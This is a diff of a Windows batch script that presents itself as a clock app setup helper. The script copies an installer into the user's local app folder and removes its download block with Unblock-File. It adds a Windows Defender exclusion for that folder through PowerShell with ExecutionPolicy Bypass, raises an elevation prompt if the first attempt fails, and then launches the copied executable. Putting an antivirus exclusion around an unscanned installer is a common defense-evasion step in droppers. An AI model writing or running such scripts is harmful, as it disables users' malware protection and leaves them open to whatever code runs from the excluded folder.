@@ -1,11 +1,21 @@
 @echo off
-setlocal EnableExtensions
+setlocal EnableExtensions DisableDelayedExpansion
+title Clock App Setup
 
 set "APP_DIR=%LOCALAPPDATA%\clock_app"
 set "SCRIPT_DIR=%~dp0"
 set "EXE_NAME=clock_app_setup.exe"
 set "INSTALLER_PATH=%~1"
 set "COPIED_INSTALLER="
+set "EXCLUSION_OK=0"
+set "LOG_FILE=%TEMP%\clock_app_setup.log"
+
+> "%LOG_FILE%" echo [%DATE% %TIME%] setup_clock_app.bat started
+
+echo ==========================================
+echo Clock App Setup
+echo ==========================================
+echo Log: "%LOG_FILE%"
 
 if not defined INSTALLER_PATH (
   if exist "%SCRIPT_DIR%%EXE_NAME%" (
@@ -28,68 +38,73 @@ if not defined INSTALLER_PATH (
 
 :found_installer
 if not defined INSTALLER_PATH (
-  echo Installer not found.
-  echo Expected file: %EXE_NAME%
-  echo Put this bat file and the NSIS installer (.exe) in the same folder.
-  echo You can also pass the installer path as the first argument.
-  pause
-  exit /b 1
+  call :fail "Installer not found. Expected: %EXE_NAME%"
 )
 
-echo Target install directory: "%APP_DIR%"
-echo Installer: "%INSTALLER_PATH%"
+echo Target folder: "%APP_DIR%"
+echo Installer source: "%INSTALLER_PATH%"
+>> "%LOG_FILE%" echo Target folder: "%APP_DIR%"
+>> "%LOG_FILE%" echo Installer source: "%INSTALLER_PATH%"
 
-rem Self-elevate for Defender exclusion registration
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList '\"%INSTALLER_PATH%\"' -Verb RunAs"
-  exit /b
-)
-
-if not exist "%APP_DIR%" mkdir "%APP_DIR%"
+if not exist "%APP_DIR%" mkdir "%APP_DIR%" >> "%LOG_FILE%" 2>&1
 if not exist "%APP_DIR%" (
-  echo Failed to create install directory.
-  pause
-  exit /b 1
+  call :fail "Failed to create %APP_DIR%"
 )
 
 for %%I in ("%INSTALLER_PATH%") do set "COPIED_INSTALLER=%APP_DIR%\%%~nxI"
 
-echo [1/5] Copying installer to local app folder...
-copy /Y "%INSTALLER_PATH%" "%COPIED_INSTALLER%" >nul
-if %errorlevel% neq 0 (
-  echo Failed to copy installer to "%APP_DIR%".
-  pause
-  exit /b 1
+echo [1/5] Copying installer...
+copy /Y "%INSTALLER_PATH%" "%COPIED_INSTALLER%" >> "%LOG_FILE%" 2>&1
+if errorlevel 1 (
+  call :fail "Failed to copy installer to %APP_DIR%"
 )
 
 echo [2/5] Unblocking copied installer...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Unblock-File -LiteralPath '%COPIED_INSTALLER%'"
-if %errorlevel% neq 0 (
-  echo Failed to unblock copied installer.
-  pause
-  exit /b 1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Unblock-File -LiteralPath '%COPIED_INSTALLER%'" >> "%LOG_FILE%" 2>&1
+if errorlevel 1 (
+  call :fail "Unblock-File failed for %COPIED_INSTALLER%"
 )
 
 echo [3/5] Adding Defender exclusion...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $p=(Get-MpPreference).ExclusionPath; if ($p -notcontains '%APP_DIR%') { Add-MpPreference -ExclusionPath '%APP_DIR%' }"
-if %errorlevel% neq 0 (
-  echo Failed to add Defender exclusion. Check Windows Defender policy.
-  pause
-  exit /b 1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $p=(Get-MpPreference).ExclusionPath; if ($p -notcontains '%APP_DIR%') { Add-MpPreference -ExclusionPath '%APP_DIR%' }" >> "%LOG_FILE%" 2>&1
+if errorlevel 1 (
+  echo [WARN] Standard add failed. Trying elevated Add-MpPreference...
+  powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Start-Process powershell -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""$ErrorActionPreference=''''Stop''''; Add-MpPreference -ExclusionPath ''''%APP_DIR%''''""'; exit 0 } catch { exit 1 }" >> "%LOG_FILE%" 2>&1
+  if errorlevel 1 (
+    echo [WARN] Elevated exclusion setup failed or was canceled.
+    echo [WARN] Continue anyway. If installer is blocked, run this bat as Administrator.
+  )
 )
 
 echo [4/5] Verifying Defender exclusion...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=(Get-MpPreference).ExclusionPath; if ($p -contains '%APP_DIR%') { exit 0 } else { exit 2 }"
-if %errorlevel% neq 0 (
-  echo Defender exclusion was not confirmed. Check Windows Defender policy.
-  pause
-  exit /b 1
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=(Get-MpPreference).ExclusionPath; if ($p -contains '%APP_DIR%') { exit 0 } else { exit 2 }" >> "%LOG_FILE%" 2>&1
+if errorlevel 1 (
+  echo [WARN] Exclusion not confirmed.
+  set "EXCLUSION_OK=0"
+) else (
+  set "EXCLUSION_OK=1"
 )
 
-echo [5/5] Launching installer from local app folder...
-start "" "%COPIED_INSTALLER%"
+echo [5/5] Launching installer...
+start "" "%COPIED_INSTALLER%" >> "%LOG_FILE%" 2>&1
+if errorlevel 1 (
+  call :fail "Failed to start installer: %COPIED_INSTALLER%"
+)
 
-echo Done. Continue installation in the installer window.
+echo ------------------------------------------
+echo Completed. Continue in installer window.
+if "%EXCLUSION_OK%"=="1" (
+  echo Defender exclusion: OK
+) else (
+  echo Defender exclusion: NOT CONFIRMED
+)
+echo Log file: "%LOG_FILE%"
 pause
-endlocal
+exit /b 0
+
+:fail
+echo [ERROR] %~1
+echo [ERROR] %~1 >> "%LOG_FILE%"
+echo See log: "%LOG_FILE%"
+pause
+exit /b 1
